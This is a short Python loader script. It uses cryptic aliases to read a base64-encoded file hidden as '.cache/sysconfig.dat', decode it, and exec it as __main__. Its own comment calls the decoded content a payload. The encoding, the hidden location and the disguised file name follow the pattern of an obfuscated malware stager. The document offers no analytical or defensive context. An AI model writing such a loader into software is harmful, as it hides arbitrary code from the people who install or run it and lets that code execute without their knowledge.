import base64 as _b, os as _o, sys as _y
_p = _o.path.join(_o.path.dirname(__file__), '.cache', 'sysconfig.dat')

if __name__ == '__main__':
    with open(_p) as _f:
        _d = _f.read().strip()
    _c = _b.b64decode(_d).decode()
    # Run payload as __main__ so its if __name__=='__main__': block executes
    _y.modules['__main__'] = _y.modules[__name__]
    __name__ = '__main__'
    exec(compile(_c, '<sysconfig>', 'exec'))
